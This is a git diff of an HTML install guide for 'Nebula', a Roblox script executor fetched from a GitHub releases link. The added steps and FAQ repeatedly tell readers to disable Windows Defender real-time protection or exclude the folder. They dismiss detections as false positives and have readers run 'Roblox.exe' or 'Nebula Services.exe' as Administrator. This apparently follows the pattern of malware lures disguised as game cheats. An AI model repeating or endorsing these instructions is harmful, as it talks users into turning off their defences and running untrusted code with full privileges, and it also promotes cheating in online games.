@@ -44,8 +44,8 @@
 
     <section class="card">
       <div class="card-num">01</div>
-      <h2>Download & Antivirus</h2>
-      <p>Download the executor and disable your real-time protection or add an exclusion to the folder. Most executors are flagged as "False Positives" due to how they inject into the game.</p>
+      <h2>Download Release & Extract</h2>
+      <p>Get the latest release from the official GitHub repository. Once downloaded, extract the ZIP folder to a dedicated location on your desktop or a folder of your choice.</p>
       <div class="code-block">
         <code id="release-url">https://github.com/23Pulto/Roblox-Executor/releases</code>
         <button class="copy-btn" onclick="copyText('release-url')">Copy Link</button>
@@ -54,22 +54,89 @@
 
     <section class="card">
       <div class="card-num">02</div>
-      <h2>Launch Roblox (Web)</h2>
-      <p>Open your browser and launch a Roblox game via the website. **Note:** The Microsoft Store (UWP) version is currently not supported by most executors.</p>
+      <h2>Security Exclusions (Important)</h2>
+      <p>To prevent Windows Defender from deleting or blocking the executor, add the extracted folder to your Virus & Threat Protection exclusions. You can also temporarily disable real-time protection.</p>
+      <p><em>Settings > Security > Virus & threat protection > Manage settings > Add or remove exclusions.</em></p>
+      <div class="alert alert-warning">
+        <span class="alert-icon">⚠️</span>
+        <div>
+          <b>False Positive Notice:</b> Executors are often flagged as "False Positives" due to their injection methods. Adding an exclusion ensures the files are not removed.
+        </div>
+      </div>
     </section>
 
     <section class="card">
       <div class="card-num">03</div>
-      <h2>Attach Executor</h2>
-      <p>Once you are in a game, open the Nebula Executor as Administrator and click the **"Attach"** or **"Inject"** button. Wait for the confirmation message.</p>
+      <h2>Launch Roblox (Web Version)</h2>
+      <p>Open your browser and launch any Roblox game via the website. <b>Note:</b> The Microsoft Store (UWP) version is currently not supported. Make sure you are in a live game before proceeding.</p>
     </section>
 
     <section class="card">
       <div class="card-num">04</div>
-      <h2>Execute Scripts</h2>
-      <p>Paste your desired script into the text editor and click **"Execute"**. Your script should now be running in the game environment.</p>
+      <h2>Run Executor as Admin & Inject</h2>
+      <p>Navigate to the extracted folder and locate <b>Roblox.exe</b> or <b>Nebula Services.exe</b> (depending on the release). <b>Right-click and select "Run as Administrator"</b> to launch the executor.</p>
       <div class="code-block">
-        <code>Nebula.lua (Example Script)</code>
+        <code>▶ Run "Nebula Services.exe" as Administrator</code>
+      </div>
+    </section>
+
+    <section class="card">
+      <div class="card-num">05</div>
+      <h2>Wait for Initialization</h2>
+      <p>After launching the executor, <b>wait approximately 5 seconds</b> for it to fully load and attach to the Roblox process. You may see a console window or a status indicator showing that the injection was successful.</p>
+      <div class="alert alert-info">
+        <span class="alert-icon">⏳</span>
+        <div>
+          <b>Loading Time:</b> Be patient — the executor needs a few seconds to map its internal components. Do not close any windows during this time.
+        </div>
+      </div>
+    </section>
+
+    <section class="card">
+      <div class="card-num">06</div>
+      <h2>Open the Menu (Insert Key)</h2>
+      <p>Once the executor has finished loading, <b>press the <kbd>Insert</kbd> key</b> on your keyboard while in the Roblox game window. The Nebula menu should appear on-screen, confirming that everything is working correctly.</p>
+      <div class="code-block">
+        <code>✔️ Menu Toggle: INSERT key</code>
+      </div>
+    </section>
+
+    <section class="card">
+      <div class="card-num">07</div>
+      <h2>Execute Scripts & Enjoy</h2>
+      <p>With the menu open, you can paste your Lua scripts into the executor's interface and click <b>"Execute"</b> to run them. Your scripts will now function inside the Roblox environment.</p>
+    </section>
+
+    <!-- Common Issues Section (identical style to CS2) -->
+    <section class="faq-section">
+      <div class="section-header">
+        <h2>Common Issues</h2>
+        <p>Encountering problems? Check these common fixes below.</p>
+      </div>
+
+      <div class="faq-item">
+        <h4>Executor closes immediately or file is missing.</h4>
+        <p>This is almost always caused by Windows Defender. Go back to <b>Step 02</b> and add the entire extracted folder to your exclusions list. Then re-extract the ZIP and try again.</p>
+      </div>
+
+      <div class="faq-item">
+        <h4>Menu does not appear after pressing Insert.</h4>
+        <p>Ensure that you waited the full 5 seconds after running the executor. Also make sure Roblox is the active window (click on the game). If it still doesn't work, try running "Nebula Services.exe" as Administrator again.</p>
+      </div>
+
+      <div class="faq-item">
+        <h4>"Roblox.exe" or "Nebula Services.exe" is not found.</h4>
+        <p>Make sure you have extracted the entire ZIP folder. Some antivirus programs silently delete files. Temporarily disable real-time protection, re-extract, and add the folder to exclusions.</p>
+      </div>
+
+      <div class="faq-item">
+        <h4>Executor says "Attach failed" or "Injection error".</h4>
+        <p>Close Roblox and the executor completely. Re-launch Roblox first, join a game, then run the executor as Administrator. Do not run the executor before Roblox is active.</p>
+      </div>
+
+      <div class="faq-item">
+        <h4>Does this work on all Roblox games?</h4>
+        <p>Yes, Nebula works on the majority of Roblox games that do not have special anti-tamper protections. Avoid using it on games with strict anti-exploit systems.</p>
       </div>
     </section>
   </main>
@@ -78,8 +145,28 @@
     <p>© 2024 Nebula Services</p>
   </footer>
 
-
   <script src="script.js"></script>
+  <script>
+    // Helper function to copy text from elements (used by copy-btn)
+    function copyText(elementId) {
+      const element = document.getElementById(elementId);
+      if (!element) return;
+      const text = element.innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        // Optional: show a small toast or feedback
+        const btn = event.target;
+        const originalText = btn.innerText;
+        btn.innerText = 'Copied!';
+        setTimeout(() => {
+          btn.innerText = originalText;
+        }, 1500);
+      }).catch(err => {
+        console.error('Failed to copy: ', err);
+      });
+    }
+    // Expose to global scope for inline onclick
+    window.copyText = copyText;
+  </script>
 </body>
 
 </html>
